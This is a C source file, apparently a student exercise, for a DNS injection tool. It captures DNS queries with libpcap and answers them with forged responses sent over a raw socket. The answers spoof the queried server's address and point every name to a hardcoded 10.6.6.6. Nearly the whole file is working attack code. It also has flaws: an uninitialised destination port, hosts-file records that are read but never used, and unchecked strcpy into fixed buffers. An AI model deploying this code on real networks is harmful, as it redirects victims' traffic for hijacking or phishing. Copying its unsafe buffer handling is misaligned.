#include "dnsinject.h"
struct _ip_record create_record (char* str);

/*Using  some global variables for easy communication :)*/
/*Bad practice but...............*/
char * spdevice_name;
char * filename;
char * _string;
char * _expressions;
pcap_t* phndlr;
char errbuf[BUFFSIZE];
char dns_response[2048];

int main(int argc ,char* argv[])
{
    int counter_i = 1;
    bpf_u_int32 mask = 0; // Defining as per LibPcap
    bpf_u_int32 net = 0;  // Defining as per LibPcap
    struct bpf_program fp; // Filter expression "BPF"
    int read_from_file = 0;// if -r option is used
    FILE * filep;              // PCAP File to read input from
    struct ip *ip_hdr;
    struct sniff_udp *udp;
    struct _ip_record ip_record[10];
    char buffer[256];
    /*Parse the command line options 1st,
    we only support '-i' , '-f' for this exercise :D */
    
    while(argc>counter_i)
    {
        if(argv[counter_i][0] == '-'){
            
            switch(argv[counter_i][1]){
                case 'i':
                    spdevice_name = argv[counter_i+1];
                    break;
                case 'f':
                    filename = argv[counter_i+1];
                    read_from_file = 1;
                    break;
                default:
                    fprintf(stdout,"UNSUPPORTED INPUT \n");
                    fprintf(stdout, "USAGE  Directions:\ndnsinject [-i interface] [-f file] [-s string]  expression\n");
                    fprintf(stdout,"Please re Run the program/command :)\n");
                    return ERR_RETURN;
                }
            counter_i+=2;
        }else{
        _expressions = argv[counter_i++];
        break;
        }
    }
    if(read_from_file){
        filep = fopen(filename,"rb");
        if(NULL == filep){
            fprintf(stdout,"Failed to open the file\n");
            return 0;
        }else{
            int flag = 0;
            memset(buffer,0,256);
            memset(ip_record,0,10*sizeof(struct _ip_record));
             while (fgets(buffer, 256, filep))
             {
                 ip_record[flag] = create_record(buffer);
                 flag++;
                 if(flag>9)
                     break;
             }
        }
    {	int i;
        fprintf(stdout,"File read:\n");
        for ( i = 0; i < 10; i++)
        {
            if(ip_record[i].ip_address[0] == 0)
				continue;
			fprintf(stdout,"%s \t %s,\n", ip_record[i].ip_address, ip_record[i].domain_name);

			
        }
    }

        
    }else{    

    if(spdevice_name == NULL){
        spdevice_name  = pcap_lookupdev(errbuf);
        fprintf(stdout,"No input for device to capture, defaulting to [%s]\n",spdevice_name);
    }else if(pcap_lookupnet(spdevice_name,&net,&mask,errbuf) == -1){
                fprintf(stdout,"device lookup for [%s] failed\n", spdevice_name);
                fprintf(stdout,"Exiting");
                return ERR_RETURN;
    }
    
    open_pcap();
}
         if(NULL != _expressions && ERR_RETURN != compile_filter(&fp,net)){
            if(ERR_RETURN == set_filter(&fp))
                return  ERR_RETURN;
         }
		/** We are keeping headers ready at the beginning for  spoofed response and we will use same buffer for each response*/
          ip_hdr = (struct ip*)dns_response;
          udp = (struct sniff_udp*)(dns_response+sizeof(struct ip));
          ip_hdr->ip_hl = 5;
          ip_hdr->ip_v = 4;
          ip_hdr->ip_tos = 0;
          ip_hdr->ip_len = 0;
          ip_hdr->ip_id = 0;
          ip_hdr->ip_off = 0;
          ip_hdr->ip_ttl = 255;
          ip_hdr->ip_p = 17;
          ip_hdr->ip_sum = 0;
          udp->sport = htons(53);
        
        
        pcap_loop(phndlr,-1,got_packet, _string);
            
        
        //pcap_freecode(&fp);
        pcap_close(phndlr);
        fprintf(stdout,"\n\n==========END of CAPTURE=============\n\n");

}

/*If user does live packet capture by specifying an interface, open it.*/
int open_pcap(){
    phndlr = pcap_open_live(spdevice_name,BUFSIZ,1,0,errbuf);
    if(NULL == phndlr){
        fprintf(stdout,"failed to capture with error [%s]\n", errbuf);
        return ERR_RETURN;
    }

}
/*Compile the BPF filter for packet capture. Yes this is needed by the pcap lib*/
int compile_filter(struct bpf_program *fp,bpf_u_int32 net){


    char filter[128];
	sprintf(filter, "udp and dst port domain");
    
    if(ERR_RETURN == pcap_compile(phndlr,fp,filter,0,net)){
        fprintf(stdout,"Couldn't parse filter %s: %s\n", _expressions, pcap_geterr(phndlr));
        return ERR_RETURN;
    }

}
struct _ip_record create_record (char* str)
{
    struct _ip_record ip_record;
    int flag = 0;
    char *token = strtok(str, " ");

    while( token != NULL )
    {
        if (0 == flag)
            strcpy(ip_record.ip_address, token);
        else if (1 == flag)
            strcpy(ip_record.domain_name, token);

        flag++;
        token = strtok( NULL, " " );
    }
    return ip_record;
}
/*Set the BPF filter for packet capture*/
int set_filter(struct bpf_program *fp){

    if(ERR_RETURN == pcap_setfilter(phndlr,fp)){
        fprintf(stdout,"Couldn't install filter %s: %s\n", _expressions, pcap_geterr(phndlr));
        return ERR_RETURN;
    }

}



void get_raw_ip(u_int32_t raw_ip, char* ip){
  int i;
  int raw_ip2[4];
  for(i=0;i<4;i++){
    raw_ip2[i] = (raw_ip >> (i*8)) & 0xff;
  }
 
  sprintf(ip, "%d.%d.%d.%d",raw_ip2[0], raw_ip2[1], raw_ip2[2], raw_ip2[3]);
}
/*DNS Hostname comes as 3www5hello3com, need to make it www.hello.com*/
void get_dns_request(struct sniff_dnsq *dns_query, char *request){
    int i = 0, j = 0;
    while ((dns_query->query[i] != 0x00)&&(j<256)) { 
        for(j = i; j < i + (int)dns_query->query[i]; j++) {
            request[j] = dns_query->query[j+1];
        }
        request[j] = '.';
        i = j + 1;
    }
    request[j] = '\0';
}


/*Callback Function received from pcap Library*/
/*Pcap lib calls this callback everytime it receives a packet*/
/*This Function is the key , it will print per packet data as needed in problem statement*/

void got_packet(u_char *pattern, const struct pcap_pkthdr *header,const u_char *packet)
{
    /* Too many variables, keep each tracked*/
    const  struct ip *ip_hdr; /* The ip_hdr header */
    struct ip * ip_hdr_2;
    const  struct sniff_udp *udp; /* The UDP header */
    struct sniff_udp *udp_2;
    struct sniff_dns *dns;
    
    struct sniff_dnsa dns_a;
    struct sniff_dnsq dns_q;
    
    u_int16_t port;
    char ip_src[16],ip_dst[16];
    char domain_name[256];
    char * dns_data;
    char spoofed_ip[] = "10.6.6.6";      /*spoofed ip if file is null*/
    u_int size_ip;                     /*ip_hdr Heade Sizer*/
    int payload_size;                  /*Application layer packet size(HTTP etc)*/    
    
    /*check for bad input*/
    if(NULL == packet || NULL == header)
        return;
    ip_hdr = (struct ip*)(packet+SIZE_ETHERNET);
    //fprintf(stdout,"got raw ip \n");
    get_raw_ip(ip_hdr->ip_dst.s_addr,ip_dst);
    get_raw_ip(ip_hdr->ip_src.s_addr,ip_src);
    //fprintf(stdout,"got raw ip %s:\n", ip_dst);
    size_ip = ip_hdr->ip_hl*4;
    udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
    //port = ntohs(udp->sport);
    //fprintf(stdout,"size ip %s:\n",size_ip);
    dns = (struct sniff_dns *)(packet + SIZE_ETHERNET + size_ip + sizeof(struct sniff_udp));
    //fprintf(stdout,"size ip %s:\n",size_ip);
    dns_q.query = (char*)(packet + SIZE_ETHERNET + size_ip + sizeof(struct sniff_udp) + sizeof(struct sniff_dns));
    if(dns_q.query[0]<=0)
		return;
    get_dns_request(&dns_q,domain_name);


    dns_data = dns_response + sizeof(struct ip) + sizeof(struct sniff_udp);
    memset (dns_data,0,256);
    memcpy(dns_data,dns->id,2);
    memcpy(dns_data + 2,"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00",10);
    //fprintf(stdout,"dnsq size [%d], [%s]\n",strlen(dns_q.query),dns_q.query);
    payload_size = strlen(domain_name)+2;

    memcpy(dns_data+12,domain_name,payload_size);
    payload_size +=12;
    memcpy(dns_data+payload_size,"\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04",16);
    memcpy(dns_data+payload_size+16,"\x0a\x06\x06\x06",4);
    payload_size +=20;
    ip_hdr_2 = (struct ip*)dns_response;
    ip_hdr_2->ip_src.s_addr = inet_addr (ip_dst);
    ip_hdr_2->ip_dst.s_addr = inet_addr(ip_src);
    udp_2 = (struct sniff_udp*)(dns_response+sizeof(struct ip));
    udp_2->sport = htons(53);
    udp_2->dport= htons(port);
    udp_2->udp_length = htons(sizeof(struct sniff_udp) + payload_size);
    udp_2->udp_sum = 0;
    payload_size+= sizeof(struct ip) + sizeof(struct sniff_udp);
    //fprintf(stdout,"send response  \n");
    send_dns_answer(ip_src,port,payload_size);
    
return;
}
void send_dns_answer(char* ip, u_int16_t port,int packlen) {
  struct sockaddr_in to_addr;
  int bytes_sent;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  int one = 1;
  const int *val = &one;

  if (sock < 0) {
    fprintf(stderr, "Error creating socket");
    return;
  }
  to_addr.sin_family = AF_INET;
  to_addr.sin_port = htons(port);
  to_addr.sin_addr.s_addr = inet_addr(ip);
 
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
    fprintf(stderr, "Error at setsockopt()");
    return;
  }
 
  bytes_sent = sendto(sock, dns_response, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
  if(bytes_sent < 0)
    fprintf(stderr, "Error sending data");
}
